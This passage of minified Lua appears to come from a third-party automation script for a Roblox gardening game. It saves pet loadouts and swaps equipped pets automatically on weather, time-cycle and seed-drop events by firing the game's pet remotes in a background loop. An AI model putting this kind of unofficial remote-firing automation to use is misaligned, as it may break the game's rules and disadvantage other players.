			rarity = Z.PetEquipTriggers.GetPetRarityPetEquipTriggers(i, J),
			size = Z.PetEquipTriggers.GetPetSizePetEquipTriggers(J),
			variant = Z.PetEquipTriggers.GetPetVariantPetEquipTriggers(J);
			equipped = type(V) == "table" and V[j] == true or false;
			tool = G;
			data = J
		}
	end;
	GetPetToolsPetEquipTriggers = function(G)
		local V = {}
		local j = {}
		local i = {
			y.Backpack;
			y.Character
		}
		for y, i in ipairs(i) do
			if i and i.Parent then
				for y, i in ipairs(i:GetChildren()) do
					local c = Z.PetEquipTriggers.GetPetToolInfoPetEquipTriggers(i, G)
					if c and not j[c.id] then
						j[c.id] = true
						table.insert(V, c)
					end
				end
			end
		end
		return V, j
	end;
	GetReplicaPetsPetEquipTriggers = function(G, V)
		local y = {}
		local j = Z.DataReplica.GetData("Inventory")
		local i = type(j) == "table" and j.Pets or nil
		if type(i) ~= "table" then
			return y
		end
		for j, i in pairs(i) do
			if type(i) == "table" then
				local c = tostring(i.Id or i.PetId or j or "")
				if c ~= "" and not ((type(V) == "table" and V[c])) then
					local V = Z.PetEquipTriggers.ResolvePetNamePetEquipTriggers(i.Name or i.Pet or i.Species or i.PetName or "")
					if V ~= "" then
						table.insert(y, {
							key = tostring(j);
							id = c,
							name = V,
							displayName = Z.PetEquipTriggers.GetPetDisplayNamePetEquipTriggers(V);
							rarity = Z.PetEquipTriggers.GetPetRarityPetEquipTriggers(V, i),
							size = Z.PetEquipTriggers.GetPetSizePetEquipTriggers(i);
							variant = Z.PetEquipTriggers.GetPetVariantPetEquipTriggers(i);
							equipped = type(G) == "table" and G[c] == true or false;
							data = i
						})
					end
				end
			end
		end
		return y
	end;
	GetInventoryPetsPetEquipTriggers = function()
		local G = Z.PetEquipTriggers.GetEquippedIdsPetEquipTriggers()
		local V, y = Z.PetEquipTriggers.GetPetToolsPetEquipTriggers(G)
		for G, y in ipairs(Z.PetEquipTriggers.GetReplicaPetsPetEquipTriggers(G, y)) do
			table.insert(V, y)
		end
		table.sort(V, function(G, V)
			if tostring(G.displayName or "") ~= tostring(V.displayName or "") then
				return tostring(G.displayName or "") < tostring(V.displayName or "")
			end
			if tostring(G.size or "") ~= tostring(V.size or "") then
				return tostring(G.size or "") < tostring(V.size or "")
			end
			return tostring(G.id or "") < tostring(V.id or "")
		end)
		return V, G
	end,
	GetEquippedPetsPetEquipTriggers = function()
		local G = Z.PetEquipTriggers.GetInventoryPetsPetEquipTriggers()
		local V = {}
		for G, y in ipairs(G) do
			if y.equipped then
				table.insert(V, y)
			end
		end
		return V
	end,
	GetPetNameDropdownPetEquipTriggers = function()
		local G = {}
		local V = {}
		for y, j in ipairs(g.PetDataTable or {}) do
			local i = tostring(j.petname or "")
			if i ~= "" and not V[i] then
				V[i] = true
				local y = tostring(j.displayname or i)
				local c = tostring(j.rarity or "Unknown")
				local J = Z.Data.GetRarityColor(c)
				table.insert(G, {
					Text = string.format("<font color=\'#FFFFFF\'>%s</font> <font color=\'%s\'>%s</font>", y, J, c),
					Value = i
				})
			end
		end
		table.sort(G, function(G, V)
			return tostring(G.Text or "") < tostring(V.Text or "")
		end)
		return G
	end;
	GetExactPetDropdownPetEquipTriggers = function()
		local G = {}
		for V, y in ipairs(Z.PetEquipTriggers.GetInventoryPetsPetEquipTriggers()) do
			local Z = y.equipped and " Active" or ""
			local j = string.format("%s | %s | %s | %s%s", tostring(y.displayName or y.name), tostring(y.size or "Normal"), tostring(y.variant or "Normal"), tostring(y.id or "?"), Z)
			table.insert(G, {
				Text = j,
				Value = tostring(y.id or y.key or "")
			})
		end
		return G
	end;
	NewRuleIdPetEquipTriggers = function()
		return tostring(os.time()) .. ("_" .. tostring(math.random(100000, 999999)))
	end;
	CleanRuleNamePetEquipTriggers = function(G)
		G = (tostring(G or "")):match("^%s*(.-)%s*$") or ""
		if G == "" then
			return "Pet Loadout"
		end
		return G:sub(1, 40)
	end,
	GetRulesTablePetEquipTriggers = function()
		if type(h.pet_equip_rules) ~= "table" then
			h.pet_equip_rules = {}
		end
		return h.pet_equip_rules
	end;
	GetSortedRulesPetEquipTriggers = function()
		local G = {}
		for V, y in pairs(Z.PetEquipTriggers.GetRulesTablePetEquipTriggers()) do
			if type(y) == "table" then
				y.id = tostring(y.id or V)
				table.insert(G, y)
			end
		end
		table.sort(G, function(G, V)
			local y = tonumber(G.createdAt) or 0
			local Z = tonumber(V.createdAt) or 0
			if y ~= Z then
				return y < Z
			end
			return tostring(G.id or "") < tostring(V.id or "")
		end)
		return G
	end,
	GetRuleSummaryPetEquipTriggers = function(G)
		if type(G) ~= "table" then
			return "Invalid loadout"
		end
		local V = {}
		for G, y in ipairs(type(G.pets) == "table" and G.pets or {}) do
			local j, i = Z.PetEquipTriggers.ResolvePetNamePetEquipTriggers(y.pet or y.name or "?")
			local c = math.max(math.floor(tonumber(y.amount) or 1), 1)
			local J = {}
			if tostring(y.size or "") ~= "" then
				table.insert(J, tostring(y.size))
			end
			if tostring(y.variant or "") ~= "" then
				table.insert(J, tostring(y.variant))
			end
			local T = # J > 0 and " [" .. (table.concat(J, ", ") .. "]") or ""
			table.insert(V, string.format("%s x%d%s", i ~= "" and i or j, c, T))
		end
		local y = tostring(G.triggerType or "Manual")
		local j = tostring(G.triggerName or "Manual")
		local i = math.max(tonumber(G.duration) or 0, 0)
		local c = i > 0 and tostring(i) .. "s" or (y == "Manual" and "until restore" or "event active")
		local J = # V > 0 and table.concat(V, " + ") or "No pets"
		return string.format("%s | %s / %s | %s | %s", tostring(G.name or "Loadout"), y, j, c, J)
	end;
	AddRulePetEquipTriggers = function(G, V, y, j, i)
		if type(i) ~= "table" or # i == 0 then
			return false, "Add at least one pet to the loadout"
		end
		V = tostring(V or "Manual")
		local c = Z.PetEquipTriggers.GetTriggerOptionsPetEquipTriggers(V)
		if type(c) ~= "table" then
			return false, "Invalid trigger type"
		end
		y = tostring(y or c[1] or "Manual")
		j = math.max(math.floor(tonumber(j) or 0), 0)
		local J = {}
		for G, V in ipairs(i) do
			if type(V) == "table" then
				local G = Z.PetEquipTriggers.ResolvePetNamePetEquipTriggers(V.pet or V.name or "")
				local y = math.clamp(math.floor(tonumber(V.amount) or 1), 1, 12)
				if G ~= "" then
					table.insert(J, {
						pet = G,
						amount = y;
						size = tostring(V.size or "");
						variant = tostring(V.variant or "")
					})
				end
			end
		end
		if # J == 0 then
			return false, "No valid pets in loadout"
		end
		local T = Z.PetEquipTriggers.NewRuleIdPetEquipTriggers();
		(Z.PetEquipTriggers.GetRulesTablePetEquipTriggers())[T] = {
			id = T,
			name = Z.PetEquipTriggers.CleanRuleNamePetEquipTriggers(G);
			enabled = true,
			triggerType = V;
			triggerName = y;
			duration = j;
			pets = J,
			createdAt = os.time()
		}
		a.Save.SaveDataSync()
		Z.PetEquipTriggers.AddPetEquipLog("Added loadout: " .. Z.PetEquipTriggers.GetRuleSummaryPetEquipTriggers((Z.PetEquipTriggers.GetRulesTablePetEquipTriggers())[T]))
		if g.PetEquipTriggerUi.RefreshPetEquipRules then
			g.PetEquipTriggerUi.RefreshPetEquipRules()
		end
		return true, T
	end,
	RemoveRulePetEquipTriggers = function(G)
		G = tostring(G or "")
		local V = Z.PetEquipTriggers.GetRulesTablePetEquipTriggers()
		local y = V[G]
		if type(y) ~= "table" then
			return false
		end
		local j = tostring(y.name or "Loadout")
		V[G] = nil
		if tostring(h.pet_equip_manual_rule_id or "") == G then
			h.pet_equip_manual_rule_id = ""
		end
		if Z.PetEquipTriggers.ActiveRuleId == G or tostring(h.pet_equip_active_rule_id or "") == G then
			Z.PetEquipTriggers.RestorePreviousPetEquipTriggers("Deleted active loadout")
		end
		a.Save.SaveDataSync()
		Z.PetEquipTriggers.AddPetEquipLog("Deleted loadout: " .. j)
		if g.PetEquipTriggerUi.RefreshPetEquipRules then
			g.PetEquipTriggerUi.RefreshPetEquipRules()
		end
		return true
	end,
	ToggleRulePetEquipTriggers = function(G, V)
		G = tostring(G or "")
		local y = (Z.PetEquipTriggers.GetRulesTablePetEquipTriggers())[G]
		if type(y) ~= "table" then
			return false
		end
		y.enabled = V == true
		if not y.enabled and tostring(h.pet_equip_manual_rule_id or "") == G then
			h.pet_equip_manual_rule_id = ""
		end
		if not y.enabled and ((Z.PetEquipTriggers.ActiveRuleId == G or tostring(h.pet_equip_active_rule_id or "") == G)) then
			Z.PetEquipTriggers.RestorePreviousPetEquipTriggers("Loadout disabled")
		end
		a.Save.SaveDataSync()
		Z.PetEquipTriggers.AddPetEquipLog(((y.enabled and "Enabled" or "Disabled")) .. (" loadout: " .. tostring(y.name or "Loadout")))
		return true
	end;
	GetWeatherValuesPetEquipTriggers = function()
		return y.ReplicatedStorage and y.ReplicatedStorage:FindFirstChild("WeatherValues") or nil
	end,
	NamesMatchPetEquipTriggers = function(G, V)
		return Z.PetEquipTriggers.NormaliseTextPetEquipTriggers(G) == Z.PetEquipTriggers.NormaliseTextPetEquipTriggers(V)
	end,
	IsTimeCycleWeatherPetEquipTriggers = function(G)
		if Z.WeatherTriggers and type(Z.WeatherTriggers.IsTimeCycleNameWeatherTriggers) == "function" then
			return Z.WeatherTriggers.IsTimeCycleNameWeatherTriggers(G) and not Z.WeatherTriggers.IsTimeCyclePhaseWeatherTriggers(G)
		end
		return false
	end,
	IsTimeCyclePhasePetEquipTriggers = function(G)
		if Z.WeatherTriggers and type(Z.WeatherTriggers.IsTimeCyclePhaseWeatherTriggers) == "function" then
			return Z.WeatherTriggers.IsTimeCyclePhaseWeatherTriggers(G)
		end
		return false
	end,
	GetRulePriorityPetEquipTriggers = function(G)
		if type(G) ~= "table" then
			return 0
		end
		local V = tostring(G.triggerType or "Manual")
		if V == "Time Cycle" then
			if Z.PetEquipTriggers.IsTimeCycleWeatherPetEquipTriggers(G.triggerName) then
				return Z.PetEquipTriggers.RulePriority["Time Cycle Weather"] or 80
			end
			return Z.PetEquipTriggers.RulePriority["Time Cycle Phase"] or 60
		end
		return Z.PetEquipTriggers.RulePriority[V] or 0
	end;
	GetWeatherActivePetEquipTriggers = function(G)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		return Z.WeatherTriggers and Z.WeatherTriggers.IsTriggerActiveWeatherTriggers(G) == true or false
	end,
	GetTimeCycleActivePetEquipTriggers = function(G)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		return Z.WeatherTriggers and Z.WeatherTriggers.IsTriggerActiveWeatherTriggers(G) == true or false
	end;
	GetSeedPackActivePetEquipTriggers = function(G)
		local V = y.EventSeedDrops
		if not V or not V.Parent then
			return false
		end
		G = tostring(G or "Any Seed Pack")
		for V, y in ipairs(V:GetChildren()) do
			if G == "Any Seed Pack" then
				return true
			end
			if G == "Gold Seed" and y:GetAttribute("GoldSeed") == true then
				return true
			end
			if G == "Rainbow Seed" and y:GetAttribute("RainbowSeed") == true then
				return true
			end
		end
		return false
	end,
	GetDroppedSeedActivePetEquipTriggers = function()
		local G = y.DroppedItems
		if not G or not G.Parent then
			return false
		end
		local V = tostring(g.player_userid or "")
		for G, y in ipairs(G:GetChildren()) do
			if tostring(y:GetAttribute("ItemCategory") or "") ~= "Seeds" then
				continue
			end
			local Z = tostring(y:GetAttribute("DroppedBy") or "")
			if Z == "" or Z == V then
				return true
			end
		end
		return false
	end;
	GetRuleConditionPetEquipTriggers = function(G)
		if type(G) ~= "table" or G.enabled ~= true then
			return false, "", "disabled"
		end
		local V = tostring(G.triggerType or "Manual")
		local y = tostring(G.triggerName or "Manual")
		local j = false
		if V == "Manual" then
			j = tostring(h.pet_equip_manual_rule_id or "") == tostring(G.id or "")
		elseif V == "Default" then
			j = true
		elseif V == "Weather" then
			j = Z.PetEquipTriggers.GetWeatherActivePetEquipTriggers(y)
		elseif V == "Time Cycle" then
			j = Z.PetEquipTriggers.GetTimeCycleActivePetEquipTriggers(y)
		elseif V == "Seed Pack" then
			j = Z.PetEquipTriggers.GetSeedPackActivePetEquipTriggers(y)
		elseif V == "Dropped Seed" then
			j = Z.PetEquipTriggers.GetDroppedSeedActivePetEquipTriggers()
		end
		local i = tostring(G.id or "") .. ("|" .. (V .. ("|" .. y)))
		return j == true, i, j and "active" or "inactive"
	end;
	GetBestRulePetEquipTriggers = function()
		local G = nil
		local V = - 1
		local y = ""
		local j = os.time()
		local i = {}
		for c, J in ipairs(Z.PetEquipTriggers.GetSortedRulesPetEquipTriggers()) do
			local T, d = Z.PetEquipTriggers.GetRuleConditionPetEquipTriggers(J)
			if d ~= "" and T then
				i[d] = true
			end
			if T then
				local G = math.max(tonumber(J.duration) or 0, 0)
				local V = tonumber(J.startedAtUnix or J.startedAt) or 0
				if G > 0 and (V > 0 and j - V >= G) then
					Z.PetEquipTriggers.FinishedEventKeys[d] = true
					if tostring(J.triggerType or "") == "Manual" and tostring(h.pet_equip_manual_rule_id or "") == tostring(J.id or "") then
						h.pet_equip_manual_rule_id = ""
					end
					T = false
				end
				if Z.PetEquipTriggers.FinishedEventKeys[d] then
					T = false
				end
			end
			if T then
				local j = Z.PetEquipTriggers.GetRulePriorityPetEquipTriggers(J)
				if j > V then
					G = J
					V = j
					y = d
				end
			end
		end
		for G in pairs(Z.PetEquipTriggers.FinishedEventKeys) do
			if not i[G] then
				Z.PetEquipTriggers.FinishedEventKeys[G] = nil
			end
		end
		return G, y
	end,
	IsProtectedEquippedPetEquipTriggers = function(G)
		if type(G) ~= "table" then
			return true, "invalid"
		end
		if Z.PetEquipTriggers.IsSelectedPetEquipTriggers(h.pet_equip_protected_ids, G.id) or Z.PetEquipTriggers.IsSelectedPetEquipTriggers(h.pet_equip_protected_ids, G.key) then
			return true, "protected id"
		end
		if Z.PetEquipTriggers.IsSelectedPetEquipTriggers(h.pet_equip_protected_names, G.name) or Z.PetEquipTriggers.IsSelectedPetEquipTriggers(h.pet_equip_protected_names, G.displayName) then
			return true, "protected pet"
		end
		if h.pet_equip_protect_rainbow and G.variant == "Rainbow" then
			return true, "rainbow"
		end
		if h.pet_equip_protect_big_huge and ((G.size == "Big" or G.size == "Huge")) then
			return true, "big/huge"
		end
		if h.pet_equip_protect_super_secret and ((G.rarity == "Super" or G.rarity == "Secret")) then
			return true, "super/secret"
		end
		return false, ""
	end;
	PetMatchesSpecPetEquipTriggers = function(G, V)
		if type(G) ~= "table" or type(V) ~= "table" then
			return false
		end
		local y = tostring(V.id or "")
		if y ~= "" then
			return tostring(G.id or G.key or "") == y
		end
		local j = Z.PetEquipTriggers.ResolvePetNamePetEquipTriggers(V.pet or V.name or "")
		if j == "" or tostring(G.name or "") ~= j then
			return false
		end
		local i = tostring(V.size or "")
		if i ~= "" and tostring(G.size or "Normal") ~= i then
			return false
		end
		local c = tostring(V.variant or "")
		if c ~= "" and tostring(G.variant or "Normal") ~= c then
			return false
		end
		return true
	end,
	BuildRequestedSpecsPetEquipTriggers = function(G)
		local V = {}
		for G, y in ipairs(type(G) == "table" and (type(G.pets) == "table" and G.pets) or {}) do
			local j = Z.PetEquipTriggers.ResolvePetNamePetEquipTriggers(y.pet or y.name or "")
			local i = math.max(math.floor(tonumber(y.amount) or 1), 1)
			for G = 1, i, 1 do
				if j ~= "" then
					table.insert(V, {
						pet = j;
						size = tostring(y.size or ""),
						variant = tostring(y.variant or ""),
						id = tostring(y.id or "")
					})
				end
			end
		end
		return V
	end,
	BuildSnapshotPetEquipTriggers = function(G)
		local V = {}
		for G, y in ipairs(type(G) == "table" and G or {}) do
			local Z = tostring(y.id or y.key or "")
			if Z ~= "" then
				table.insert(V, {
					id = Z,
					pet = tostring(y.name or ""),
					size = tostring(y.size or "");
					variant = tostring(y.variant or "")
				})
			end
		end
		return V
	end;
	BuildRestoreRulePetEquipTriggers = function(G)
		local V = {}
		if type(G) == "table" then
			local y = # G > 0
			if y then
				for G, y in ipairs(G) do
					if type(y) == "table" then
						table.insert(V, {
							id = tostring(y.id or "");
							pet = Z.PetEquipTriggers.ResolvePetNamePetEquipTriggers(y.pet or "");
							amount = 1,
							size = tostring(y.size or "");
							variant = tostring(y.variant or "")
						})
					end
				end
			else
				for G, y in pairs(G) do
					local j = Z.PetEquipTriggers.ResolvePetNamePetEquipTriggers(G)
					if j ~= "" and (tonumber(y) and tonumber(y) > 0) then
						table.insert(V, {
							pet = j;
							amount = math.floor(tonumber(y));
							size = "";
							variant = ""
						})
					end
				end
			end
		end
		return {
			id = "restore",
			name = "Restore previous pets",
			triggerType = "Manual",
			triggerName = "Restore";
			duration = 0,
			pets = V
		}
	end,
	BuildPetPlanPetEquipTriggers = function(G, V, y)
		local j = Z.PetEquipTriggers.BuildRequestedSpecsPetEquipTriggers(G)
		local i = {}
		local c = {}
		local J = {}
		local T = 0
		for G, V in ipairs(V) do
			if V.equipped then
				local G = Z.PetEquipTriggers.IsProtectedEquippedPetEquipTriggers(V)
				if G then
					J[tostring(V.id or "")] = true
					T += 1
				end
			end
		end
		local d = math.max(y - T, 0)
		for G, y in ipairs(j) do
			if # i >= d then
				break
			end
			local j = nil
			for G, V in ipairs(V) do
				local i = tostring(V.id or "")
				if V.equipped and (not J[i] and (not c[i] and Z.PetEquipTriggers.PetMatchesSpecPetEquipTriggers(V, y))) then
					j = V
					break
				end
			end
			if not j then
				for G, V in ipairs(V) do
					local i = tostring(V.id or "")
					if not V.equipped and (not c[i] and Z.PetEquipTriggers.PetMatchesSpecPetEquipTriggers(V, y)) then
						j = V
						break
					end
				end
			end
			if j then
				local G = tostring(j.id or "")
				c[G] = true
				table.insert(i, j)
			end
		end
		return i, J, math.max(# j - # i, 0), # j
	end;
	GetMaxPetSlotsPetEquipTriggers = function()
		local G = Z.PlayerData and (Z.PlayerData.GetMaxEquippedPets and Z.PlayerData.GetMaxEquippedPets()) or 3
		return math.max(math.floor(tonumber(G) or 3), 1)
	end;
	BuildSignaturePetEquipTriggers = function(G, V)
		local y = {
			tostring(G and G.id or "")
		}
		for G, V in ipairs(type(V) == "table" and V or {}) do
			table.insert(y, tostring(V.id or V.key or ""))
		end
		return table.concat(y, "|")
	end,
	WaitForPetStatePetEquipTriggers = function(G, V, y)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		local j = os.clock() + math.max(tonumber(y) or 1, .2)
		repeat
			local y = Z.PetEquipTriggers.GetEquippedIdsPetEquipTriggers()
			if ((y[G] == true)) == V then
				return true
			end
			task.wait(.1)
		until os.clock() >= j
		return false
	end;
	EquipPetByIdPetEquipTriggers = function(G)
		if type(G) ~= "table" then
			return false
		end
		local V = tostring(G.id or G.key or "")
		if V == "" then
			return false
		end
		if G.equipped then
			return true
		end
		local j = G.tool
		if j and (j.Parent and (y.Character and j.Parent ~= y.Character)) then
			local G = y.Character:FindFirstChildOfClass("Humanoid")
			if G then
				pcall(function()
					G:EquipTool(j)
				end)
				task.wait(.15)
			end
		end
		local i = y.Networking and (y.Networking.Pets and y.Networking.Pets.RequestToggleFollower)
		local c = false
		if i and type(i.Fire) == "function" then
			c = pcall(function()
				i:Fire(V)
			end)
		end
		if not c and (j and (j.Parent and type(j.Activate) == "function")) then
			c = pcall(function()
				j:Activate()
			end)
		end
		if not c then
			return false
		end
		return Z.PetEquipTriggers.WaitForPetStatePetEquipTriggers(V, true, 2)
	end,
	UnequipPetByIdPetEquipTriggers = function(G)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		local V = y.Networking and (y.Networking.Pets and y.Networking.Pets.RequestUnequip)
		local j = false
		if V and type(V.Fire) == "function" then
			j = pcall(function()
				V:Fire(G)
			end)
		end
		if not j then
			local V = y.Networking and (y.Networking.Pets and y.Networking.Pets.RequestToggleFollower)
			if V and type(V.Fire) == "function" then
				j = pcall(function()
					V:Fire(G)
				end)
			end
		end
		if not j then
			return false
		end
		return Z.PetEquipTriggers.WaitForPetStatePetEquipTriggers(G, false, 2)
	end;
	ApplyRulePetEquipTriggers = function(G, V)
		if type(G) ~= "table" or Z.PetEquipTriggers.BusyPetEquipTriggers then
			return false
		end
		Z.PetEquipTriggers.BusyPetEquipTriggers = true
		local y = false
		local j, i = pcall(function()
			local j = Z.PetEquipTriggers.GetInventoryPetsPetEquipTriggers()
			local i = Z.PetEquipTriggers.GetMaxPetSlotsPetEquipTriggers()
			local c, J, T, d = Z.PetEquipTriggers.BuildPetPlanPetEquipTriggers(G, j, i)
			local u = Z.PetEquipTriggers.BuildSignaturePetEquipTriggers(G, c)
			local q = tostring(G.id or "")
			if d <= 0 then
				Z.PetEquipTriggers.SetStatusPetEquipTriggers("No pets in loadout", "#FFCC66")
				return
			end
			if # c == 0 and T > 0 then
				Z.PetEquipTriggers.SetStatusPetEquipTriggers("No matching pet tools found", "#FF6666")
				Z.PetEquipTriggers.AddPetEquipLog("No matching pet tools found for " .. tostring(G.name or "Loadout"))
				return
			end
			if u == Z.PetEquipTriggers.ActiveSignature and q == Z.PetEquipTriggers.ActiveRuleId then
				Z.PetEquipTriggers.SetStatusPetEquipTriggers("Active: " .. tostring(G.name or "Loadout"), "#7CFC00")
				y = true
				return
			end
			local g = {}
			for G, V in ipairs(j) do
				if V.equipped then
					table.insert(g, V)
				end
			end
			if q ~= "restore" and (tostring(G.triggerType or "") ~= "Default" and (h.pet_equip_restore_previous and Z.PetEquipTriggers.ActiveRuleId == "")) then
				h.pet_equip_restore_snapshot = Z.PetEquipTriggers.BuildSnapshotPetEquipTriggers(g)
			end
			local E = {}
			for G in pairs(J) do
				E[G] = true
			end
			for G, V in ipairs(c) do
				E[tostring(V.id or "")] = true
			end
			for G, V in ipairs(g) do
				local y = tostring(V.id or "")
				if not E[y] then
					Z.PetEquipTriggers.UnequipPetByIdPetEquipTriggers(y)
					task.wait(.1)
				end
			end
			local H = Z.PetEquipTriggers.GetEquippedIdsPetEquipTriggers()
			for G, V in ipairs(c) do
				local y = tostring(V.id or "")
				if y ~= "" and not H[y] then
					Z.PetEquipTriggers.EquipPetByIdPetEquipTriggers(V)
					task.wait(.1)
				end
			end
			Z.PetEquipTriggers.ActiveRuleId = q
			Z.PetEquipTriggers.ActiveSignature = u
			h.pet_equip_active_rule_id = q
			if q ~= "restore" then
				G.startedAt = os.time()
				G.startedAtUnix = os.time()
			end
			a.Save.SaveDataSync()
			local r = T > 0 and " | ignored " .. (tostring(T) .. " over max/missing") or ""
			Z.PetEquipTriggers.SetStatusPetEquipTriggers("Applied " .. (tostring(G.name or "Loadout") .. r), "#66CCFF")
			Z.PetEquipTriggers.AddPetEquipLog("Applied loadout: " .. (tostring(G.name or "Loadout") .. (" | " .. (tostring(V or "trigger") .. r))))
			y = true
		end)
		Z.PetEquipTriggers.BusyPetEquipTriggers = false
		if not j then
			Z.PetEquipTriggers.SetStatusPetEquipTriggers("Apply failed", "#FF6666")
			warn("[PetEquipTriggers]", i)
			return false
		end
		return y
	end;
	RestorePreviousPetEquipTriggers = function(G)
		if Z.PetEquipTriggers.ActiveRuleId == "" and tostring(h.pet_equip_active_rule_id or "") == "" then
			return false
		end
		local V = h.pet_equip_restore_snapshot
		Z.PetEquipTriggers.ActiveRuleId = ""
		Z.PetEquipTriggers.ActiveSignature = ""
		h.pet_equip_active_rule_id = ""
		h.pet_equip_manual_rule_id = ""
		if h.pet_equip_restore_previous and (type(V) == "table" and next(V) ~= nil) then
			local y = Z.PetEquipTriggers.BuildRestoreRulePetEquipTriggers(V)
			Z.PetEquipTriggers.AddPetEquipLog("Restoring previous pets: " .. tostring(G or "trigger ended"))
			Z.PetEquipTriggers.ApplyRulePetEquipTriggers(y, "restore")
			Z.PetEquipTriggers.ActiveRuleId = ""
			Z.PetEquipTriggers.ActiveSignature = ""
			h.pet_equip_active_rule_id = ""
		else
			Z.PetEquipTriggers.SetStatusPetEquipTriggers("Trigger ended", "#FFCC66")
			Z.PetEquipTriggers.AddPetEquipLog("Trigger ended: " .. tostring(G or "restore disabled"))
		end
		a.Save.SaveDataSync()
		return true
	end,
	TriggerManualPetEquipTriggers = function(G)
		G = tostring(G or "")
		local V = (Z.PetEquipTriggers.GetRulesTablePetEquipTriggers())[G]
		if type(V) ~= "table" then
			Z.PetEquipTriggers.SetStatusPetEquipTriggers("Select a manual loadout", "#FFCC66")
			return false
		end
		if V.enabled ~= true then
			V.enabled = true
		end
		h.pet_equip_manual_rule_id = G
		V.startedAt = os.time()
		V.startedAtUnix = os.time()
		a.Save.SaveDataSync()
		Z.PetEquipTriggers.AddPetEquipLog("Manual trigger: " .. tostring(V.name or "Loadout"))
		return Z.PetEquipTriggers.ApplyRulePetEquipTriggers(V, "manual trigger")
	end,
	ProcessPetEquipTriggers = function()
		if h.pet_triggers_v2_enabled == true then
			Z.PetEquipTriggers.ActiveRuleId = ""
			Z.PetEquipTriggers.ActiveSignature = ""
			h.pet_equip_active_rule_id = ""
			h.pet_equip_manual_rule_id = ""
			Z.PetEquipTriggers.SetStatusPetEquipTriggers("")
			return false
		end
		if not h.pet_equip_enabled then
			if Z.PetEquipTriggers.ActiveRuleId ~= "" or tostring(h.pet_equip_active_rule_id or "") ~= "" then
				Z.PetEquipTriggers.RestorePreviousPetEquipTriggers("System disabled")
			end
			Z.PetEquipTriggers.SetStatusPetEquipTriggers("")
			return false
		end
		if not q.IsLoadingCompleted() then
			Z.PetEquipTriggers.SetStatusPetEquipTriggers("Waiting for loading", "#FFCC66")
			return false
		end
		local G, V = Z.PetEquipTriggers.GetBestRulePetEquipTriggers()
		if type(G) == "table" then
			local y = math.max(tonumber(G.duration) or 0, 0)
			local j = tonumber(G.startedAtUnix or G.startedAt) or 0
			if y > 0 and (j > 0 and os.time() - j >= y) then
				Z.PetEquipTriggers.FinishedEventKeys[V] = true
				if tostring(G.triggerType or "") == "Manual" then
					h.pet_equip_manual_rule_id = ""
				end
				Z.PetEquipTriggers.RestorePreviousPetEquipTriggers("Duration ended")
				return true
			end
			Z.PetEquipTriggers.ApplyRulePetEquipTriggers(G, tostring(G.triggerType or "trigger") .. (" / " .. tostring(G.triggerName or "")))
			return true
		end
		if Z.PetEquipTriggers.ActiveRuleId ~= "" or tostring(h.pet_equip_active_rule_id or "") ~= "" then
			Z.PetEquipTriggers.RestorePreviousPetEquipTriggers("No active trigger")
			return true
		end
		local y = false
		for G, V in ipairs(Z.PetEquipTriggers.GetSortedRulesPetEquipTriggers()) do
			if type(V) == "table" and (V.enabled == true and tostring(V.triggerType or "") == "Manual") then
				y = true
				break
			end
		end
		Z.PetEquipTriggers.SetStatusPetEquipTriggers(y and "Manual ready - press Run Manual Now" or "Waiting for trigger", "#CFCFCF")
		return false
	end,
	HookEventsPetEquipTriggers = function()
		local G = Z.PetEquipTriggers.GetWeatherValuesPetEquipTriggers()
		if G then
			for V, y in ipairs(Z.PetEquipTriggers.GetTriggerOptionsPetEquipTriggers("Weather")) do
				(G:GetAttributeChangedSignal(y .. "_Playing")):Connect(function()
					Z.PetEquipTriggers.AddPetEquipLog("Weather changed: " .. (y .. (" = " .. tostring(G:GetAttribute(y .. "_Playing") == true))))
					Z.PetEquipTriggers.ProcessPetEquipTriggers()
				end)
			end
		end;
		(y.Workspace:GetAttributeChangedSignal("ActivePhase")):Connect(function()
			Z.PetEquipTriggers.AddPetEquipLog("Phase changed: " .. tostring(y.Workspace:GetAttribute("ActivePhase") or "?"))
			Z.PetEquipTriggers.ProcessPetEquipTriggers()
		end);
		(y.Workspace:GetAttributeChangedSignal("ActiveWeather")):Connect(function()
			Z.PetEquipTriggers.AddPetEquipLog("Cycle weather changed: " .. tostring(y.Workspace:GetAttribute("ActiveWeather") or "?"))
			Z.PetEquipTriggers.ProcessPetEquipTriggers()
		end)
		if y.EventSeedDrops then
			y.EventSeedDrops.ChildAdded:Connect(function(G)
				Z.PetEquipTriggers.AddPetEquipLog("Seed pack appeared: " .. tostring(G and G.Name or "?"))
				Z.PetEquipTriggers.ProcessPetEquipTriggers()
			end)
			y.EventSeedDrops.ChildRemoved:Connect(function(G)
				Z.PetEquipTriggers.AddPetEquipLog("Seed pack removed: " .. tostring(G and G.Name or "?"))
				Z.PetEquipTriggers.ProcessPetEquipTriggers()
			end)
		end
		if y.DroppedItems then
			y.DroppedItems.ChildAdded:Connect(function(G)
				if G and tostring(G:GetAttribute("ItemCategory") or "") == "Seeds" then
					Z.PetEquipTriggers.AddPetEquipLog("Dropped seed appeared")
					Z.PetEquipTriggers.ProcessPetEquipTriggers()
				end
			end)
		end
	end,
	StartPetEquipTriggers = function()
		if Z.PetEquipTriggers.StartedPetEquipTriggers then
			return false
		end
		Z.PetEquipTriggers.StartedPetEquipTriggers = true
		Z.PetEquipTriggers.HookEventsPetEquipTriggers()
		task.spawn(function()
			while not g.is_forced_stop do
				task.wait(1)
				local G, V = pcall(Z.PetEquipTriggers.ProcessPetEquipTriggers)
				if not G then
					Z.PetEquipTriggers.SetStatusPetEquipTriggers("System error", "#FF6666")
					warn("[PetEquipTriggers]", V)
				end
			end
		end)
		return true
	end
}
Z.PlayerData = {
	GetBackpackSpaceUpgradesPurchased = function()
		return y.LocalPlayer:GetAttribute("BackpackSpaceUpgradesPurchased") or 0
	end,
	GetFriends = function()
		return y.LocalPlayer:GetAttribute("Friends") or 0
	end,
	GetFruitCount = function()
		return y.LocalPlayer:GetAttribute("FruitCount") or 0
	end,
	GetIsInOwnGarden = function()
		return y.LocalPlayer:GetAttribute("IsInOwnGarden") or false
	end;
	GetLoadingScreenActive = function()
		return y.LocalPlayer:GetAttribute("LoadingScreenActive") or false
	end,
	GetLoadingScreenDone = function()
		return y.LocalPlayer:GetAttribute("LoadingScreenDone") or false
	end;
	GetMaxEquippedPets = function()
		return y.LocalPlayer:GetAttribute("MaxEquippedPets") or 3
	end,
	GetMaxFruitCapacity = function()
		return y.LocalPlayer:GetAttribute("MaxFruitCapacity") or 100
	end,
	GetOfflineGrowthProcessed = function()
		return y.LocalPlayer:GetAttribute("OfflineGrowthProcessed") or false
